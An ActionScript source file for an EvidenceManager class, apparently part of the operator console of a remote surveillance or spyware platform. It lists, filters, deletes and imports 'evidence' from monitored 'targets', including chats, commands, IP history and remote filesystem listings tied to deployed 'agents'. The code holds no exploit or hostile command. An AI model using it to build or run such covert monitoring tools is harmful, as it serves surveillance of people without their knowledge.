package it.ht.rcs.console.evidence.controller
{
  import flash.events.Event;
  import flash.events.HTTPStatusEvent;
  import flash.events.IOErrorEvent;
  import flash.events.SecurityErrorEvent;
  import flash.filesystem.File;
  import flash.net.URLRequest;
  
  import it.ht.rcs.console.DB;
  import it.ht.rcs.console.controller.ItemManager;
  import it.ht.rcs.console.events.SessionEvent;
  import it.ht.rcs.console.evidence.model.Evidence;
  import it.ht.rcs.console.evidence.model.Filter;
  import it.ht.rcs.console.evidence.model.TypeCount;
  import it.ht.rcs.console.target.model.Target;
  import it.ht.rcs.console.utils.AlertPopUp;
  
  import mx.collections.ArrayCollection;
  import mx.collections.AsyncListView;
  import mx.collections.ListCollectionView;
  import mx.events.CollectionEvent;
  import mx.rpc.events.ResultEvent;
  import mx.utils.ObjectUtil;
  
  public class EvidenceManager extends ItemManager
  {
    
    public function EvidenceManager() { super(Evidence); }
    
    /* singleton */
    private static var _instance:EvidenceManager = new EvidenceManager();
    public static function get instance():EvidenceManager { return _instance; } 
    
    
    [Bindable]
    public var evidenceFilter:Object = { date: 'dr' };
    
    [Bindable]
    public var commandsFilter:Object = { date: 'da' };
    
    [Bindable]
    public var ipsFilter:Object = { date: 'da' };
    
    [Bindable]
    public var infoFilter:Object = { date: 'da' };
    
    [Bindable]
    public var counts:ArrayCollection;
    
    [Bindable]
    public var total:Number;
    
    
    private var bid:String;
    
    override public function refresh():void
    {
      super.refresh();
      trace(ObjectUtil.toString(evidenceFilter));
      
      DB.instance.evidence.total(evidenceFilter, onCountResult);
      DB.instance.evidence.all(evidenceFilter, onResult);
    }
    
    [Bindable]
    public var _view:ListCollectionView;
    
    private function onResult(e:ResultEvent):void
    {
      var alv:AsyncListView = new AsyncListView(e.result as ArrayCollection);
      alv.list.addEventListener(CollectionEvent.COLLECTION_CHANGE, onItemsChange);
      _view = new ListCollectionView(alv);
      dispatchDataLoadedEvent();
    }
    
    private function onShowResult(e:ResultEvent):void
    {
      var evidence:Evidence=e.result as Evidence;
    }
    
    private function onCountResult(e:ResultEvent):void
    {
      counts = e.result as ArrayCollection;
      for each (var typeCount:TypeCount in counts)
      if (typeCount.type == "total") {
        total = typeCount.count;
        break;
      }
    }
    
    override protected function onItemUpdate(event:*):void
    {
      if (event.property == 'data') return; // TODO: temporary fix. when applying filters, an update to "data" fires... ?
      
      var property:Object = new Object();
      property[event.property] = event.newValue is ArrayCollection ? event.newValue.source : event.newValue;
      DB.instance.evidence.update(event.source, property, evidenceFilter.target);
    }
    
    public function update_multi(ids:Array, property:Object, callback:Function):void
    {
      
      // property[event.property] = event.newValue is ArrayCollection ? event.newValue.source : event.newValue;
      //DB.instance.evidence.update(event.source, property, evidenceFilter.target);
      DB.instance.evidence.update_multi(ids, property, evidenceFilter.target, callback);
    }
    
    
    
    override protected function onItemRemove(item:*):void
    {
      DB.instance.evidence.destroy(item, evidenceFilter.target,onItemRemoved);
      
    }
    
    private function onItemRemoved(e:ResultEvent):void
    {
      DB.instance.evidence.total(evidenceFilter, onCountResult);
      //DB.instance.evidence.all(evidenceFilter, onResult);
    }
    
    override public function removeItem(item:Object):void
    {
      _view.list.removeItemAt(_view.getItemIndex(item))
      
    }
    
    public function destroy_all(params:Object):void
    {
      DB.instance.evidence.destroy_all(params);
    }
    
    public function removeCommand(item:Evidence, target:Target):void
    {
      trace("remove command");
      DB.instance.evidence.destroy(item, target._id);
    }
    
    public function removeIp(item:Evidence, target:Target):void
    {
      trace("remove command");
      DB.instance.evidence.destroy(item, target._id);
    }
    
    public function info(onInfoResult:Function):void
    {
      DB.instance.evidence.info(infoFilter, onInfoResult);
    }
    
    public function commands(onCommandsResult:Function):void
    {
      trace(ObjectUtil.toString(commandsFilter));
      DB.instance.evidence.commands(commandsFilter, onCommandsResult);
    }
    
    public function ips(onIpsResult:Function):void
    {
      trace(ObjectUtil.toString(ipsFilter));
      DB.instance.evidence.sync_history(ipsFilter, onIpsResult);
    }
    
    public function show(id:String, target:String, resultCallback:Function, faultCallback:Function):void
    {
      DB.instance.evidence.show(id, target, resultCallback, faultCallback);
    }
    
    public function sync(factory:String, instance:String, platform:String, version:String, user:String, device:String, onResult:Function = null):void
    {
      DB.instance.evidence.agent_status({ident: factory, instance: instance, platform: platform, level: 'elite'}, function (event:ResultEvent):void {
        
        if (event.result.status == 'OPEN' && event.result.deleted == false) {
          // send the sync parameters
          DB.instance.evidence.sync_start({bid: event.result._id, user: user, device: device, sync_time: (new Date().time) / 1000}); 
          DB.instance.evidence.sync_stop({bid: event.result._id});
          
          onResult(event);
        } else {
          AlertPopUp.show("Invalid Agent Status, cannot import");
        }
      });
    }
    
    
    public function sync_start(factory:String, instance:String, platform:String, version:String, user:String, device:String, cookie:String, sync_stat:Object, onResult:Function = null):void
    {
      DB.instance.evidence.agent_status({ident: factory, instance: instance, platform: platform, level: 'elite'}, function (event:ResultEvent):void {
        
        if (event.result.status == 'OPEN' && event.result.deleted == false) {
          // send the sync parameters
          bid=event.result._id
          DB.instance.evidence.sync_start({bid: bid, user: user, device: device, sync_time: (new Date().time) / 1000, cookie:cookie, sync_stat:sync_stat, source:"import"}); 
          onResult(event);
        } else {
          AlertPopUp.show("Invalid Agent Status, cannot import");
        }
      });
    }
    public function sync_stop(factory:String, instance:String, platform:String, version:String, user:String, device:String, cookie:String, sync_stat:Object, onResult:Function = null):void
    {
      DB.instance.evidence.sync_stop({bid:bid, cookie:cookie, sync_stat:sync_stat, source:"import"});
      
    }
    
    public function uploadEvidence(id:String, file:File, onResult:Function = null, onFault:Function = null):void
    {  
      file.addEventListener(Event.COMPLETE, onResult);
      file.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onFault);
      file.addEventListener(HTTPStatusEvent.HTTP_STATUS, onFault);
      file.addEventListener(IOErrorEvent.IO_ERROR, onFault);
      file.upload(new URLRequest(DB.hostAutocomplete(Console.currentSession.server) + "evidence/create/" + id), "content");
      trace("url: "+DB.hostAutocomplete(Console.currentSession.server) + "evidence/create/" + id);
      
    }
    
    
    
    private function haveSameElements(a:Array, b:Array):Boolean
    {  
      if(a.length!=b.length)
        return false;
      for(var i:int=0;i<a.length;i++)
      {
        if(b.indexOf(a[i])==-1)
          return false;
      }
      return true;
      
    }
    
    public function getChatFlow(program:String, to:String, from:String):ArrayCollection
    {
      var i:int;
      var chatEntry:Evidence;
      var chatFlow:ArrayCollection=new ArrayCollection();
      
      //Array with all chat partecipants
      
      if(program.toLowerCase()=="twitter")
      {
        //chatFlow.addItem(chatEntry);
        for(i=0;i<_view.length;i++)
        {
          if(_view.getItemAt(i) && _view.getItemAt(i).type=="chat")
          {
            chatEntry=_view.getItemAt(i) as Evidence;
            if(chatEntry.data.program.toLowerCase()=="twitter")
            {
              chatFlow.addItem(chatEntry);
            }
          }
        }
        return chatFlow;
      }
      
      if(!to) to="";
      if(!from) from="";
      
      var participants:Array=to.split(",");
      participants.push(from);
      
      for(i=0;i<_view.length;i++)
      {
        if(_view.getItemAt(i) && _view.getItemAt(i).type=="chat")
        {
          chatEntry=_view.getItemAt(i) as Evidence;
          
          if(chatEntry.data.rcpt!=null && chatEntry.data.rcpt!="")
          {
            var currentParticipants:Array=chatEntry.data.rcpt.split(",");
            currentParticipants.push(chatEntry.data.from);
            
            if(chatEntry.data.program==program && haveSameElements(participants, currentParticipants))
              chatFlow.addItem(chatEntry);
          }
          else
          {
            if(chatEntry.data.program==program && chatEntry.data.peer==to)
              chatFlow.addItem(chatEntry);
          }
        }
      }
      return chatFlow;
    }
    
    
    /*  public function filesystem(targetId:String, agentId:String, filter:String, onResult:Function = null):void
    {
    filter=filter.replace("//","/")
    DB.instance.evidence.filesystem(targetId, agentId, filter, onResult);
    }*/
    
    public function filesystem(targetId:String, agentId:String, path:String, onResult:Function = null):void
    {
      
      DB.instance.evidence.filesystem(targetId, agentId, path, onResult);
    }
    
    public function getFilters(onResult:Function = null, onFault:Function = null):void
    {
      DB.instance.evidence.filter_all(onResult, onFault)
    }
    
    public function destroyFilter(filter:Filter, onResult:Function=null, onFault:Function=null):void
    {
      DB.instance.evidence.filter_destroy(filter, onResult, onFault);
    }
    
    public function addFilter(filter:Object, onResult:Function=null, onFault:Function=null):void
    {
      DB.instance.evidence.filter_create(filter, onResult, onFault);
    }
    
    public function translate(id:String, target:String, onResult:Function, onFault:Function):void
    {
      DB.instance.evidence.translate(id, target, onResult, onFault)
    }
    
    override protected function onLogout(e:SessionEvent):void 
    {
      super.onLogout(e);
      evidenceFilter = { date: 'dr' };
      infoFilter = { date: 'da' };
      ipsFilter = { date: 'da' };
      commandsFilter = { date: 'da' };
      _view = null;
    }
    
  }
  
}